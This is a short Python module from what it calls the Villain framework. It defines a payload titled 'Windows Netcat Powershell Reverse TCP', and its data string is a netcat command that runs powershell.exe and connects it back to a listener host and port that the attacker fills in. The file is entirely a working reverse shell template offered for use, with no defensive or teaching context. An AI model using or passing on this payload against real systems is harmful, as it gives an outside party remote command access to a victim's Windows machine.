# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows Netcat Powershell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Netcat Powershell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'netcat-powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "nc.exe -e powershell.exe *LHOST* *LPORT*"
